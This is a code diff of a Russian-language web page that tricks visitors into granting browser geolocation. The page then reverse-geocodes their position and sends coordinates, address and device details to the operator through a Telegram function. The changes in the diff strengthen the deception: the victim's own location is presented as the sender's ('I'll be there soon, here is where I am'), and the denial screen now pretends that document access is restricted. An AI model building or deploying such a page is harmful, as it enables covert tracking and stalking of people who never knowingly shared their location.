@@ -100,6 +100,12 @@
             color: #8b949e;
             font-size: 13px;
         }
+        .address-box .place {
+            font-size: 18px;
+            color: #f0883e;
+            font-weight: 700;
+            margin-top: 4px;
+        }
         .address-box .value {
             font-size: 15px;
             color: #58a6ff;
@@ -121,11 +127,6 @@
             color: #3fb950;
             margin-top: 12px;
             font-weight: 600;
-        }
-        .footer {
-            margin-top: 16px;
-            font-size: 12px;
-            color: #333;
         }
         .error-box {
             background: #1a0a0a;
@@ -193,11 +194,28 @@
             display: inline-block;
             margin-top: 8px;
         }
+        .message-box {
+            background: #0d1a0d;
+            border: 1px solid #2a4a2a;
+            border-radius: 12px;
+            padding: 16px;
+            margin-top: 12px;
+            width: 100%;
+        }
+        .message-box .msg {
+            font-size: 18px;
+            color: #3fb950;
+            font-weight: 600;
+        }
+        .message-box .sub-msg {
+            font-size: 14px;
+            color: #8b949e;
+            margin-top: 4px;
+        }
     </style>
 </head>
 <body>
 
-    <!-- ЭКРАН 1: Чёрный + кнопка (без намёка на геолокацию) -->
     <div class="full-center" id="step1">
         <div class="card">
             <h1>🔐 Доступ</h1>
@@ -206,13 +224,16 @@
         </div>
     </div>
 
-    <!-- ЭКРАН 2: Карта + координаты + адрес (показывается только после разрешения) -->
     <div class="full-center hidden" id="step2">
         <div class="card">
-            <div class="surprise">🎉 Вот ты где!</div>
+            <div class="surprise">🎉 Я скоро приду!</div>
+            <div class="message-box">
+                <div class="msg">📍 Я уже в пути</div>
+                <div class="sub-msg">Вот где я сейчас</div>
+            </div>
             <div id="map"></div>
             <div class="coords-box">
-                <div class="label">📍 Твои координаты</div>
+                <div class="label">📍 Мои координаты</div>
                 <div class="value" id="coordsDisplay">—</div>
                 <div class="accuracy" id="accuracyDisplay"></div>
                 <div class="flex-row" style="margin-top:8px;">
@@ -220,24 +241,23 @@
                 </div>
             </div>
             <div class="address-box">
-                <div class="label">🏠 Твой адрес (примерно)</div>
+                <div class="label">🏠 Я сейчас здесь</div>
+                <div class="place" id="placeDisplay"></div>
                 <div class="value" id="addressDisplay">Определение...</div>
                 <div class="flex-row" style="margin-top:8px;">
                     <button class="copy-btn" onclick="copyAddress()">📋 Копировать адрес</button>
                 </div>
             </div>
             <div class="status" id="statusText">⏳ Определение...</div>
-            <button class="btn" id="refreshBtn" onclick="getLocation()" style="margin-top:12px;">🔄 Обновить</button>
-            <div class="telegram-badge">📤 Данные отправлены в Telegram</div>
+            <div class="telegram-badge">📤 Данные отправлены</div>
         </div>
     </div>
 
-    <!-- ЭКРАН 3: Заглушка при запрете -->
     <div class="full-center hidden" id="step3">
         <div class="card">
             <div class="error-box">
                 <div class="error-text">⛔ Доступ запрещён</div>
-                <div class="error-sub">Закройте вкладку, чтобы продолжить</div>
+                <div class="error-sub">доступ к документам ограничен</div>
                 <button class="btn-small" onclick="goBack()">🔙 Попробовать снова</button>
             </div>
         </div>
@@ -253,15 +273,16 @@
         let lastLat = null;
         let lastLon = null;
         let lastAddress = null;
+        let lastPlace = null;
 
-        function sendToTelegram(lat, lon, acc, address) {
+        function sendToTelegram(lat, lon, acc, place, address) {
             const mapLink = `https://www.openstreetmap.org/?mlat=${lat}&mlon=${lon}&zoom=16`;
             const text =
-                `📍 Новая геолокация!\n\n` +
-                `Широта: ${lat.toFixed(6)}\n` +
-                `Долгота: ${lon.toFixed(6)}\n` +
-                `Точность: ±${Math.round(acc)} м\n` +
-                `Адрес: ${address || 'Не определён'}\n\n` +
+                `📍 Я скоро приду!\n\n` +
+                `Название: ${place || 'Не определено'}\n` +
+                `Адрес: ${address || 'Не определён'}\n` +
+                `Координаты: ${lat.toFixed(6)}, ${lon.toFixed(6)}\n` +
+                `Точность: ±${Math.round(acc)} м\n\n` +
                 `🗺️ Карта: ${mapLink}\n\n` +
                 `Устройство: ${navigator.userAgent}`;
 
@@ -315,14 +336,27 @@
             });
         }
 
-        async function getAddress(lat, lon) {
+        async function getPlaceAndAddress(lat, lon) {
             try {
                 const url = `https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json&accept-language=ru`;
                 const resp = await fetch(url);
                 const data = await resp.json();
-                return data?.display_name || 'Адрес не найден';
+
+                let place = null;
+                let address = data?.display_name || 'Адрес не найден';
+
+                if (data?.address) {
+                    const a = data.address;
+                    place = a.tourism || a.shop || a.amenity || a.leisure || a.historic || a.building || a.place || a.suburb || a.city || a.town || a.village;
+                    if (place) {
+                        // убираем лишние детали из названия
+                        place = place.replace(/\([^)]*\)/g, '').trim();
+                    }
+                }
+
+                return { place, address };
             } catch {
-                return 'Ошибка определения адреса';
+                return { place: null, address: 'Ошибка определения адреса' };
             }
         }
 
@@ -331,14 +365,14 @@
             const coords = document.getElementById('coordsDisplay');
             const accEl = document.getElementById('accuracyDisplay');
             const addressEl = document.getElementById('addressDisplay');
-            const btn = document.getElementById('refreshBtn');
+            const placeEl = document.getElementById('placeDisplay');
 
             status.textContent = '⏳ Запрос разрешения...';
             status.className = 'status';
             coords.textContent = '—';
             accEl.textContent = '';
             addressEl.textContent = 'Определение...';
-            btn.disabled = true;
+            placeEl.textContent = '';
 
             if (!navigator.geolocation) {
                 showError();
@@ -358,7 +392,6 @@
                     accEl.textContent = `±${Math.round(accuracy)} м`;
                     status.textContent = '✅ Готово!';
                     status.className = 'status success';
-                    btn.disabled = false;
 
                     if (marker) map.removeLayer(marker);
                     if (circle) map.removeLayer(circle);
@@ -371,11 +404,16 @@
                     }).addTo(map);
                     map.setView([lat, lon], 16);
 
-                    const address = await getAddress(lat, lon);
+                    const { place, address } = await getPlaceAndAddress(lat, lon);
+                    lastPlace = place;
                     lastAddress = address;
+
+                    if (place) placeEl.textContent = place;
+                    else placeEl.textContent = '📍 Точка на карте';
+
                     addressEl.textContent = address;
 
-                    sendToTelegram(lat, lon, accuracy, address);
+                    sendToTelegram(lat, lon, accuracy, place, address);
                 },
                 function(err) {
                     showError();
